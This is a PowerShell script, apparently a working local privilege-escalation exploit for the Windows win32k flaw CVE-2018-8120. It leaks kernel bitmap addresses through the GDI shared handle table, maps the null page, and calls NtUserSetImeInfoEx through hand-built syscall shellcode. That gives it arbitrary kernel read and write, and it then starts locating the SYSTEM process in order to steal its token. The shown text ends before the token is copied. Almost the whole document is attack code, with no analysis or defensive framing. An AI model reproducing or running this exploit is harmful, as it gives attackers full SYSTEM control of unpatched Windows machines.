Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
 
[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct SYSTEM_MODULE_INFORMATION
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
    public UIntPtr[] Reserved;
    public IntPtr ImageBase;
    public UInt32 ImageSize;
    public UInt32 Flags;
    public UInt16 LoadOrderIndex;
    public UInt16 InitOrderIndex;
    public UInt16 LoadCount;
    public UInt16 ModuleNameOffset;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
    internal Char[] _ImageName;
    public String ImageName {
        get {
            return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
        }
    }
}
 
[StructLayout(LayoutKind.Sequential)]
public struct _PROCESS_BASIC_INFORMATION
{
    public IntPtr ExitStatus;
    public IntPtr PebBaseAddress;
    public IntPtr AffinityMask;
    public IntPtr BasePriority;
    public UIntPtr UniqueProcessId;
    public IntPtr InheritedFromUniqueProcessId;
}
 
/// Partial _PEB
[StructLayout(LayoutKind.Explicit, Size = 256)]
public struct _PEB
{
    [FieldOffset(148)]
    public IntPtr GdiSharedHandleTable32;
    [FieldOffset(248)]
    public IntPtr GdiSharedHandleTable64;
}
 
[StructLayout(LayoutKind.Sequential)]
public struct _GDI_CELL
{
    public IntPtr pKernelAddress;
    public UInt16 wProcessId;
    public UInt16 wCount;
    public UInt16 wUpper;
    public UInt16 wType;
    public IntPtr pUserAddress;
}
 
public static class API
{
 
    [DllImport("ntdll.dll")]
    public static extern uint NtQueryIntervalProfile(
        UInt32 ProfileSource,
        ref UInt32 Interval);
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr processHandle,
        int processInformationClass,
        ref _PROCESS_BASIC_INFORMATION processInformation,
        int processInformationLength,
        ref int returnLength);
 
    [DllImport("ntdll.dll")]
    public static extern int NtQuerySystemInformation(
        int SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        ref int ReturnLength);
    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        UInt64 ZeroBits,
        ref UInt64 AllocationSize,
        UInt64 AllocationType,
        UInt64 Protect);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
 
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
 
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(
        IntPtr lpAddress,
        uint dwSize,
        uint dwFreeType);
 
    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary(
        string lpFileName);
 
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);
 
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool FreeLibrary(
        IntPtr hModule);
 
    [DllImport("Kernel32.dll")]
    public static extern uint GetLastError();
    
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateBitmap(
        int nWidth,
        int nHeight,
        uint cPlanes,
        uint cBitsPerPel,
        IntPtr lpvBits);
 
    [DllImport("gdi32.dll")]
    public static extern int SetBitmapBits(
        IntPtr hbmp,
        uint cBytes,
        byte[] lpBits);
 
    [DllImport("gdi32.dll")]
    public static extern int GetBitmapBits(
        IntPtr hbmp,
        int cbBuffer,
        IntPtr lpvBits);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr CreateWindowStation(
        [MarshalAs(UnmanagedType.LPWStr)]string name,
        [MarshalAs(UnmanagedType.U4)] int reserved, 
        [MarshalAs(UnmanagedType.U4)]
        uint desiredAccess, 
        [MarshalAs(UnmanagedType.U4)] uint attributes);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetProcessWindowStation(
        IntPtr hWinSta);
    
    }
    public class Syscall
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool VirtualFree(
            IntPtr lpAddress,
            uint dwSize,
            uint dwFreeType);
    }
"@
 
#==============================================[PEB]
 
# Flag architecture $x32Architecture/!$x32Architecture
if ([System.IntPtr]::Size -eq 4) {
    echo "`n[>] Target is 32-bit!"
    $x32Architecture = 1
}
else {
    echo "`n[>] Target is 64-bit!"
}
# Current Proc handle
$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
# Process Basic Information
$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
$returnLength = New-Object Int
$CallResult = [API]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
# PID & PEB address
echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
if ($x32Architecture) {
    echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
}
else {
    echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
}
# Lazy PEB parsing
$_PEB = New-Object _PEB
$_PEB = $_PEB.GetType()
$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
# GdiSharedHandleTable
if ($x32Architecture) {
    echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
}
else {
    echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
}
# _GDI_CELL size
$_GDI_CELL = New-Object _GDI_CELL
$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
 
#==============================================[/PEB]
 
#==============================================[Bitmap]
 
echo "`n[>] Creating Bitmaps.."
 
# Manager Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64 * 0x64 * 4)
$ManagerBitmap = [API]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
if ($x32Architecture) {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff) * $_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
    echo "[+] Manager pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
}
else {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff) * $_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
    echo "[+] Manager pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}
 
# Worker Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64 * 0x64 * 4)
$WorkerBitmap = [API]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
if ($x32Architecture) {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff) * $_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
    echo "[+] Worker pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
}
else {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff) * $_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
    echo "[+] Worker pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}
 
#==============================================[/Bitmap]
 

#=====================GDI CVE-2018-8120========================
function Get-SyscallDelegate {
    <#
    .SYNOPSIS
        Allocate 32/64 bit shellcode and get a Syscall delegate for the memory pointer.
    .DESCRIPTION
        Author: Ruben Boonen (@FuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    .PARAMETER ReturnType
        Syscall return type, this should be an NTSTATUS code (UInt32).
    .PARAMETER ParameterArray
        An array of parameter types which the Syscall expects.
    .EXAMPLE
        # Sample definition for NtWriteVirtualMemory
        C:\PS> $NtWriteVirtualMemory = Get-SyscallDelegate -ReturnType '[UInt32]' -ParameterArray @([IntPtr],[IntPtr],[IntPtr],[int],[ref][int])
        # Syscall ID = 0x37 (Win7)
        C:\PS> $NtWriteVirtualMemory.Invoke([UInt16]0x37,[IntPtr]$hProcess,[IntPtr]$pBaseAddress,[IntPtr]$pBuffer,$NumberOfBytesToWrite,[ref]$OutBytes)
    #>
    
    param(
        [Parameter(Mandatory = $True)]
        [ValidateSet(
            '[Byte]',
            '[UInt16]',
            '[UInt32]',
            '[UInt64]',
            '[IntPtr]',
            '[String]')
        ]
        $ReturnType,
        [Parameter(Mandatory = $True)]
        [AllowEmptyCollection()]
        [Object[]]$ParameterArray
    )
    
    #-----------------------------
    # -= Arch x86 =-
    # ASM Source => https://github.com/mwrlabs/KernelFuzzer/blob/master/bughunt_syscall.asm
    # Compiled with Get-KeystoneAssembly => https://github.com/keystone-engine/keystone/tree/master/bindings/powershell
    #-----------------------------
    $x86SyscallStub = [Byte[]] @(
        0x55, # push ebp
        0x89, 0xE5, # mov ebp, esp
        0x81, 0xEC, 0x84, 0x00, 0x00, 0x00, # sub esp, 84h
        0x8B, 0x8D, 0x88, 0x00, 0x00, 0x00, # mov ecx, [ebp + 88h]
        0x51, # push ecx
        0x8B, 0x8D, 0x84, 0x00, 0x00, 0x00, # mov ecx, [ebp + 84h]
        0x51, # push ecx
        0x8B, 0x8D, 0x80, 0x00, 0x00, 0x00, # mov ecx, [ebp + 80h]
        0x51, # push ecx
        0x8B, 0x4D, 0x7C, # mov ecx, [ebp + 7Ch]
        0x51, # push ecx
        0x8B, 0x4D, 0x78, # mov ecx, [ebp + 78h]
        0x51, # push ecx
        0x8B, 0x4D, 0x74, # mov ecx, [ebp + 74h]
        0x51, # push ecx
        0x8B, 0x4D, 0x70, # mov ecx, [ebp + 70h]
        0x51, # push ecx
        0x8B, 0x4D, 0x6C, # mov ecx, [ebp + 6Ch]
        0x51, # push ecx
        0x8B, 0x4D, 0x68, # mov ecx, [ebp + 68h]
        0x51, # push ecx
        0x8B, 0x4D, 0x64, # mov ecx, [ebp + 64h]
        0x51, # push ecx
        0x8B, 0x4D, 0x60, # mov ecx, [ebp + 60h]
        0x51, # push ecx
        0x8B, 0x4D, 0x5C, # mov ecx, [ebp + 5Ch]
        0x51, # push ecx
        0x8B, 0x4D, 0x58, # mov ecx, [ebp + 58h]
        0x51, # push ecx
        0x8B, 0x4D, 0x54, # mov ecx, [ebp + 54h]
        0x51, # push ecx
        0x8B, 0x4D, 0x50, # mov ecx, [ebp + 50h]
        0x51, # push ecx
        0x8B, 0x4D, 0x4C, # mov ecx, [ebp + 4Ch]
        0x51, # push ecx
        0x8B, 0x4D, 0x48, # mov ecx, [ebp + 48h]
        0x51, # push ecx
        0x8B, 0x4D, 0x44, # mov ecx, [ebp + 44h]
        0x51, # push ecx
        0x8B, 0x4D, 0x40, # mov ecx, [ebp + 40h]
        0x51, # push ecx
        0x8B, 0x4D, 0x3C, # mov ecx, [ebp + 3Ch]
        0x51, # push ecx
        0x8B, 0x4D, 0x38, # mov ecx, [ebp + 38h]
        0x51, # push ecx
        0x8B, 0x4D, 0x34, # mov ecx, [ebp + 34h]
        0x51, # push ecx
        0x8B, 0x4D, 0x30, # mov ecx, [ebp + 30h]
        0x51, # push ecx
        0x8B, 0x4D, 0x2C, # mov ecx, [ebp + 2Ch]
        0x51, # push ecx
        0x8B, 0x4D, 0x28, # mov ecx, [ebp + 28h]
        0x51, # push ecx
        0x8B, 0x4D, 0x24, # mov ecx, [ebp + 24h]
        0x51, # push ecx
        0x8B, 0x4D, 0x20, # mov ecx, [ebp + 20h]
        0x51, # push ecx
        0x8B, 0x4D, 0x1C, # mov ecx, [ebp + 1Ch]
        0x51, # push ecx
        0x8B, 0x4D, 0x18, # mov ecx, [ebp + 18h]
        0x51, # push ecx
        0x8B, 0x4D, 0x14, # mov ecx, [ebp + 14h]
        0x51, # push ecx
        0x8B, 0x4D, 0x10, # mov ecx, [ebp + 10h]
        0x51, # push ecx
        0x8B, 0x4D, 0x0C, # mov ecx, [ebp + 0Ch]
        0x51, # push ecx
        0x8B, 0x45, 0x08, # mov eax, [ebp + 08h]
        0xBA, 0x00, 0x03, 0xFE, 0x7F, # mov edx, 7FFE0300h
        0xFF, 0x12, # call dword ptr [edx]
        0x89, 0xEC, # mov esp, ebp
        0x5D, # pop ebp
        0xC3)                                # ret
        
    #-----------------------------
    # -= Arch x64 =-
    # ASM Source => https://github.com/mwrlabs/KernelFuzzer/blob/master/bughunt_syscall_x64.asm
    # Compiled with Get-KeystoneAssembly => https://github.com/keystone-engine/keystone/tree/master/bindings/powershell
    #-----------------------------
    $x64SyscallStub = [Byte[]] @(
        0x55, # push rbp
        0x48, 0x89, 0xE5, # mov rbp, rsp
        0x48, 0x81, 0xEC, 0x18, 0x01, 0x00, 0x00, # sub rsp, 118h
        0x48, 0x89, 0xC8, # mov rax, rcx
        0x49, 0x89, 0xD2, # mov r10, rdx
        0x4C, 0x89, 0xC2, # mov rdx, r8
        0x4D, 0x89, 0xC8, # mov r8, r9
        0x48, 0x8B, 0x8D, 0x10, 0x01, 0x00, 0x00, # mov rcx, [rbp + 110h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0x08, 0x01, 0x00, 0x00, # mov rcx, [rbp + 108h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0x00, 0x01, 0x00, 0x00, # mov rcx, [rbp + 100h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xF8, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0F8h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xF0, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0F0h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xE8, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0E8h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xE0, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0E0h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xD8, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0D8h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xD0, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0D0h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xC8, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0C8h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xC0, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0C0h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xB8, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0B8h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xB0, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0B0h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xA8, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0A8h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0xA0, 0x00, 0x00, 0x00, # mov rcx, [rbp + 0A0h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0x98, 0x00, 0x00, 0x00, # mov rcx, [rbp + 98h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0x90, 0x00, 0x00, 0x00, # mov rcx, [rbp + 90h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0x88, 0x00, 0x00, 0x00, # mov rcx, [rbp + 88h]
        0x51, # push rcx
        0x48, 0x8B, 0x8D, 0x80, 0x00, 0x00, 0x00, # mov rcx, [rbp + 80h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x78, # mov rcx, [rbp + 78h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x70, # mov rcx, [rbp + 70h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x68, # mov rcx, [rbp + 68h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x60, # mov rcx, [rbp + 60h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x58, # mov rcx, [rbp + 58h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x50, # mov rcx, [rbp + 50h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x48, # mov rcx, [rbp + 48h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x40, # mov rcx, [rbp + 40h]
        0x51, # push rcx
        0x48, 0x8B, 0x4D, 0x38, # mov rcx, [rbp + 38h]
        0x51, # push rcx
        0x4C, 0x8B, 0x4D, 0x30, # mov r9, [rbp + 30h]
        0x4C, 0x89, 0xD1, # mov rcx, r10
        0x0F, 0x05, # syscall
        0x48, 0x89, 0xEC, # mov rsp, rbp
        0x5D, # pop rbp
        0xC3)                                      # ret
    
    if (!$SyscallStubPointer) {
        # Alloc relevant syscall stub
        if ([System.IntPtr]::Size -eq 4) {
            [IntPtr]$Script:SyscallStubPointer = [Syscall]::VirtualAlloc([System.IntPtr]::Zero, $x86SyscallStub.Length, 0x3000, 0x40)
            [System.Runtime.InteropServices.Marshal]::Copy($x86SyscallStub, 0, $SyscallStubPointer, $x86SyscallStub.Length)
        }
        else {
            [IntPtr]$Script:SyscallStubPointer = [Syscall]::VirtualAlloc([System.IntPtr]::Zero, $x64SyscallStub.Length, 0x3000, 0x40)
            [System.Runtime.InteropServices.Marshal]::Copy($x64SyscallStub, 0, $SyscallStubPointer, $x64SyscallStub.Length)
        }
    }
    
    # Courtesy of @mattifestation
    # => http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
    Function Get-DelegateType {
        Param
        (
            [OutputType([Type])]
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )
        
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
            
        Write-Output $TypeBuilder.CreateType()
    }
    
    # Prepare delegate
    if ($ParameterArray) {
        $ParamCount = $ParameterArray.Length
        $ParamList = [String]::Empty
        for ($i = 0; $i -lt $ParamCount; $i++) {
            if ($ParameterArray[$i].Value) {
                $ParamList += "[" + $ParameterArray[$i].Value.Name + "].MakeByRefType(), "
            }
            else {
                $ParamList += "[" + $ParameterArray[$i].Name + "], "
            }
        }
        $ParamList = ($ParamList.Substring(0, $ParamList.Length - 2)).Insert(0, ", ")
    }
    $IEXBootstrap = "Get-DelegateType @([UInt16] $ParamList) ($ReturnType)"
    $SyscallDelegate = IEX $IEXBootstrap
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SyscallStubPointer, $SyscallDelegate)
}


echo "`n[>] Allocating process null page.."
[IntPtr]$base_address = 0x100 # Rounded down to 0x00000000
[UInt64]$allocation_size = 0x1000 

$CallResult = [API]::NtAllocateVirtualMemory([API]::GetCurrentProcess(), [ref]$base_address, 0, [ref]$allocation_size, 0x3000, 0x4)
if ($CallResult -ne 0) {
    echo "[!] Failed to allocate null-page..`n"
    Return
}

#lpwinsta [in, optional]
#The name of the window station to be created. Window station names are case-insensitive and cannot contain backslash characters (\). 
#Only members of the Administrators group are allowed to specify a name. 
#If lpwinsta is NULL or an empty string, the system forms a window station name using the logon session identifier for the calling process. 
#To get this name, call the GetUserObjectInformation function.
$hsta = [API]::CreateWindowStation("", 0, 0x00020000L, 0);
if ($hsta -eq 0) {
    echo "[!] CreateWindowStation fail.`n"

    Return
}
$CallResult = [API]::SetProcessWindowStation($hsta)
if ($CallResult -eq 0) {
    echo "[!] SetProcessWindowStation fail.`n"
    Return
}


if ($x32Architecture) {

}
else {
    $ptr_workerpvscan0 = [System.BitConverter]::GetBytes([Int64]$WorkerpvScan0)
    $ptr_mangerpvscan0 = [System.BitConverter]::GetBytes([Int64]$ManagerpvScan0 - 8)


    [System.Runtime.InteropServices.Marshal]::Copy($ptr_workerpvscan0, 0, 0x28, $ptr_workerpvscan0.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($ptr_mangerpvscan0, 0, 0x50, $ptr_mangerpvscan0.Length)

    [IntPtr]$ime = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x200)
    

    for($i=1; $i -le 0x200; $i++)
    {
        [System.Runtime.InteropServices.Marshal]::WriteByte($ime, $i, 0)
    }
    
    [Int64]$p = $ime.ToInt64()
    
    [System.Runtime.InteropServices.Marshal]::Copy($ptr_workerpvscan0, 0, $p, 8)
    [System.Runtime.InteropServices.Marshal]::Copy($ptr_workerpvscan0, 0, $p + 0x8, 8)

    
    [System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes([Int32]0x180), 0, $p + 0x10, 4)
    [System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes([Int32]0xabcd), 0, $p + 0x14, 4)
    [System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes([Int32]0x6), 0, $p + 0x18, 4)
    [System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes([Int32]0x10000), 0, $p + 0x1c, 4)
    [System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes([Int32]0x4800200), 0, $p + 0x28, 4)
    

    $NtUserSetImeInfoEx = Get-SyscallDelegate -ReturnType '[UInt64]' -ParameterArray @([IntPtr])
    $NtUserSetImeInfoEx.Invoke([UInt16]0x1307, [IntPtr]$ime)

}


#=====================GDI CVE-2018-8120========================



#==============================================[Leak loaded module base addresses]
 
[int]$BuffPtr_Size = 0
while ($true) {
    [IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
    $SystemInformationLength = New-Object Int
 
    # SystemModuleInformation Class = 11
    $CallResult = [API]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
 
    # STATUS_INFO_LENGTH_MISMATCH
    if ($CallResult -eq 0xC0000004) {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
        [int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
    }
    # STATUS_SUCCESS
    elseif ($CallResult -eq 0x00000000) {
        break
    }
    # Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
    else {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
        echo "[!] Error, NTSTATUS Value: $('{0:X}' -f ($CallResult))`n"
        return
    }
}
 
$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
if ([System.IntPtr]::Size -eq 4) {
    $SYSTEM_MODULE_INFORMATION_Size = 284
} else {
    $SYSTEM_MODULE_INFORMATION_Size = 296
}
 
$BuffOffset = $BuffPtr.ToInt64()
$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
$BuffOffset = $BuffOffset + [System.IntPtr]::Size
 
$SystemModuleArray = @()
for ($i=0; $i -lt $HandleCount; $i++){
    $SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
    $Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
 
    $HashTable = @{
        ImageName = $Cast.ImageName
        ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
        ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
    }
 
    $Object = New-Object PSObject -Property $HashTable
    $SystemModuleArray += $Object
 
    $BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
}
 
# Free SystemModuleInformation array
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
 
#==============================================[/Leak loaded module base addresses]


#==============================================[Duplicate SYSTEM token]

if (!$x32Architecture) {
    $UniqueProcessIdOffset = 0x180
    $TokenOffset = 0x208         
    $ActiveProcessLinks = 0x188
}
else {
    $UniqueProcessIdOffset = 0xb4
    $TokenOffset = 0xf8         
    $ActiveProcessLinks = 0xb8
}
 
# Arbitrary Kernel read
function Bitmap-Read {
    param ($Address)
    $CallResult = [API]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    [IntPtr]$Pointer = [API]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
    $CallResult = [API]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
    if ($x32Architecture) {
        [System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
    }
    else {
        [System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
    }
    $CallResult = [API]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}
 
# Arbitrary Kernel write
function Bitmap-Write {
    param ($Address, $Value)
    $CallResult = [API]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    $CallResult = [API]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
}
 


# Get EPROCESS entry for System process
echo "`n[>] Leaking SYSTEM _EPROCESS.."
$KernelBase = $SystemModuleArray[0].ImageBase
$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
$KernelHanle = [API]::LoadLibrary("$KernelType")
$PsInitialSystemProcess = [API]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
$CallResult = [API]::FreeLibrary($KernelHanle)
echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
